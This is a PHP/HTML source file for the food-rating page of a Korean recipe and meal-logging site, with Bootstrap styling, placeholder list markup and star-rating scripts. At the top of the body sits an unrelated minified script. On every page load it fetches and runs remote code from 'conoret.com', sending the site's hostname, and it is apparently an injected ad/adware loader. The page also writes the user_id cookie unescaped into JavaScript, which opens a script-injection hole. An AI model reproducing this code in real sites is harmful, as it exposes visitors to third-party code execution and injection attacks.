<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="">
        <meta name="author" content="ssosso.table.u">
        <meta name="generator" content="ssosso.table food-db 0.1.0">
        <link rel="icon" href="src/favicon.ico">

        <title>ssosso-table.food-db.rating</title>

        <link rel="canonical" href="http://ssossotable.com">

        <!-- Bootstrap CSS -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
        <style>
            .bd-placeholder-img {
                font-size: 1.125rem;
                text-anchor: middle;
                -webkit-user-select: none;
                -moz-user-select: none;
                user-select: none;
            }
            <!-- 모바일 화면 -->
            @media (min-width: 768px) {
                .bd-placeholder-img-lg {
                    font-size: 3.5rem;
                }

            }
            /* 태블릿, 아이패드 */
        </style>
        <!-- Custom styles for this template -->
        <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="./css/main/cover.css" rel="stylesheet">
        <link rel="stylesheet" href="/css/rating.css">

        <style type="text/css">
            /* iPhone4와 같은 높은 해상도 가로 */
            @media only screen and (max-width : 768px) {
                body {
                    padding: 0!important;
                    margin: 0!important;
                }
                .cover-container {
                    padding: 0!important;
                    margin: 0!important;
                }
                #scroll_layout {
                    width: 100% !important;
                    margin: 0!important;
                }
                main {
                    padding: 0!important;
                    margin: 0!important;
                }
                .food-image img {
                    width: 40px!important;
                    height: 40px!important;
                }
                .fs-3 {
                    font-size: 14px !important;
                }
                .food-rating img {
                    width: 15px!important;
                    height: 30px!important;
                }
                .nav-link {
                    font-size: 10px;
                }
                .masthead-brand {
                    width: 40px;
                    height: 40px;
                }
                #food-info-image {
                    width: 240px;
                    height: 240px;
                }
                .rating-stars {
                    width: 25px !important;
                    height: 50px !important;
                }
                .rating-image img {
                    width: 80px !important;
                    height: 80px !important;
                }
            }
            @media (min-width : 768px) and (max-width : 1366px) {
                body {
                    padding: 0!important;
                    margin: 0!important;
                }
                .cover-container {
                    padding: 0!important;
                    margin: 0!important;
                }
                #scroll_layout {
                    width: 100% !important;
                    margin: 0!important;
                }
                main {
                    padding: 0!important;
                    margin: 0!important;
                }
                .food-image img {
                    width: 40px!important;
                    height: 40px!important;
                }
            }
            body {
                padding:0!important;
                margin-left: 0!important;
                margin-right: 0!important;
                margin-bottom: 0!important;

            }
            .cover-container {
                padding:0!important;
                margin-left: 0!important;
                margin-right: 0!important;
                margin-bottom: 0!important;
            }
            main {
                padding: 0!important;
                margin: 0!important;
                height: 100%;
                width: 100%;
            }
            .card {
                width: 100% !important;
            }
            #scroll_layout {
                height: 100%;
            }
            nav {
                background-color:#ffebaa;
                padding: 0!important;
                height: 100%!important;
            }
            .cover-container {
                max-width: 100%;
                width: 100%;
                padding-left: 0!important;
                padding-right: 0!important;
                margin: 0!important;
            }
            #food-info {
                width: 100%;
                height: 100%;
                background-color: transparent;
            }
        </style>

        <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
        <script type="text/javascript">
            let mql = window.matchMedia("screen and (max-width: 768px)");
            let flag=false;
            mql.addListener(function(e) {
                if(e.matches) {
                    flag=true;
                    console.log('모바일 화면 입니다.');
                    //document.getElementById('nav').classList.remove('fixed-top')
                    //document.getElementById('footer').classList.remove('fixed-bottom')
                    document.getElementById('rating').classList.remove('justify-content-center')
                    document.getElementById('food-info').style.cssText=`width: 100%; height: 100%; display:none;`
                } else {
                    flag=false
                    //document.getElementById('nav').classList.add('fixed-top')
                    //document.getElementById('footer').classList.add('fixed-bottom')
                    document.getElementById('rating').classList.add('justify-content-center')
                    document.getElementById('food-info').style.cssText=`width: 100%; height: 100%;`
                    console.log('데스크탑 화면 입니다.');
                }
            });
            let rating_placeHolder=`
            <div class="rating-placeholders">
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                </div>
            `
            let loading=`
            <div id="loading" style="height: 140px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true" onclick="read_more();">
                <div style="display: inline-block; margin: auto;">
                    <img src="/src/loading.gif" height="90" width="90">
                </div>
            </div>
            `
            let rating_list={}
            let rating_form=``
            let rating_dict={}
            let src=null;
            let rating_info=null;
            let keys=null;
            let rating_info_json={};
            let foods={}
            let before_left='/src/rate_star_before.png';
            let before_right='/src/rate_star_before.png';
            let after_left='/src/rate_star_after.png';
            let after_right='/src/rate_star_after.png';
            let score=-1;

            let id = <?php echo $_COOKIE['user_id']?>

            let ratingIdx=0
            let lim=0

            async function read_more() {
                foods={}
                if (lim === rating_list.length) {
                    document.getElementById('loading').innerHTML=`
                    <div style="display: inline-block; margin: auto;">
                        <span>더 이상 불러올 음식이 없어요</span>
                    </div>
                    `
                }
                if((ratingIdx+20)>=src.length) {
                    lim=rating_list.length
                }
                else {
                    lim=ratingIdx+20
                }
                for(let i=0;i<lim;i++) {
                    rating_list[i].style.cssText = "height: 140px; display: flex!important";
                }
                ratingIdx+=20
            }
            function show_foodinfo() {
                let info=rating_info_json[arguments[0]]
                if(flag===false) {
                    let format=`
                    <div class="card-body" id="title">
                        <img id="food-info-image" src="/src/food_placeholder.png" height="360px" width="360px"/>
                        <h1 class="card-title" id="food-name">${info.name}</h1>
                        <p class="card-text" id="food-traits">특성 목록</p>
                        <div id="rating" style="margin-bottom: 50px;">
                            ${getScore(info.rating-1, arguments[0],100)}
                        </div>
                    </div>
                    `
                    document.getElementById('food-info').innerHTML=format
                }
                else {
                    foodInfo(arguments[0],rating_info_json[arguments[0]])
                }
            }
        </script>
        <script type="text/javascript" src="/script/rating.js"></script>
    </head>

    <body class="text-center vsc-initialized" cz-shortcut-listen="true">
        <script type="text/javascript">
            window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
        </script>
    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="">
        <nav id="nav" class="navbar d-flex">
            <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="64px" height="64px"></a>
            <a class="nav-link active p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
            <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
            <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
            <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
                <div class="offcanvas-header">
                    <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                    <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
                </div>
                <div class="offcanvas-body">
                    <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                        <li class="nav-item">
                            <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                        </li>
                    </ul>
                    <div class="input-group mb-3 mt-3">
                        <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                        <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                    </div>
                </div>
            </div>
        </nav>

        <main role="main" class="inner cover d-flex" id="rating">
            <script>
                let lock=false
                $(async function () {
                    $('#scroll_layout').scroll(function() {
                        console.log($('#scroll_layout').scrollTop())
                        console.log($('main').height())
                        console.log($('#scroll_layout').prop('scrollHeight'))
                        if($('#scroll_layout').scrollTop() + $('main').height() >= $('#scroll_layout').prop('scrollHeight')) {
                            // $('html, #scroll_layout').animate({
                            //     scrollTop: 0
                            // }, 1000);
                            console.log('aaa')
                            read_more()
                        }
                    });
                })
            </script>
            <div class="card p-3 bg-light" id="scroll_layout">

            </div>
            <div class="card" id='food-info'>
                <div class="card-body" id="title">
                    <img id="food-info-image" src="/src/food_placeholder.png" height="360px" width="360px"/>
                    <h1 class="card-title" id="food-name">음식 이름</h1>
                    <p class="card-text" id="food-traits">특성 목록</p>
                    <div id="rating" style="margin-bottom: 50px;">
                        <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                        <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                        <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                        <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                        <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    </div>
                </div>
            </div>
            <script>
                document.getElementById('scroll_layout').innerHTML=rating_placeHolder
            </script>
        </main>

        <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
            <div class="inner">
                <p style="margin: 0;">Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, of <a href="http://ssossotable.com">@ssosso.table</a></p>
            </div>
        </footer>
    </div>
        <script>
            init()
        </script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
  </body>
</html>